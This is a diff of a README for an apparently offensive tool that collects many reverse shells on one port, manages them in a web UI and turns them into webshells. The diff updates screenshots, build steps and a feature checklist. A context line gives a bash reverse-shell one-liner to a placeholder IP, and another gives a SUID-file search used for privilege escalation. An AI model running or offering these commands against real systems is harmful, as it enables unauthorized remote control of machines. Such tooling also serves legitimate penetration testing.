@@ -8,7 +8,8 @@ Receive multiple reverse shells on one port, and manage them in a web UI.
 
 With the usage of [xterm.js](https://xtermjs.org/), complex commands like vi, tmux and Ctrl-C works ( you may need to gain pty, and set correct stty size. )
 
-![screenshot](images/screenshot.png)
+![Web-based reverse shell management](docs/screenshot-1.png)
+![Convert reverse shell into antsword webshell](docs/screenshot-2.png)
 
 ## Running
 
@@ -27,7 +28,15 @@ receive reverse shells on port 9999 (`bash -i >& /dev/tcp/your-ip/9999 0>&1`).
 
 ## development
 
+Do this before building docker.
+
 ```
+# install typescript globally
+npm install -g typescript
+```
+
+```
+# install local node_modules dependencies
 make backend-environment
 make frontend-environment
 ```
@@ -53,7 +62,9 @@ pull requests are welcome.
 - [x] authentication required for web UI
 - [x] receive reverse shell
 - [x] automatically remove dead connections
-- [ ] fancy web UI
+- [x] fancy web UI
 - [ ] resize terminal and send terminal event (currently you need to do `stty` command)
 - [ ] snippets ( eg. `find / -perm 4000 2>/dev/null` )
-- [ ] API for reverse shell
+- [ ] reverse shell session configuration
+- [x] API for reverse shell ("To Websocat" button; gives you a bash command to connect to the reverse shell)
+- [x] Reverse shell to Webshell ("To Antsword" button; [read more](antsword-usage.md) )
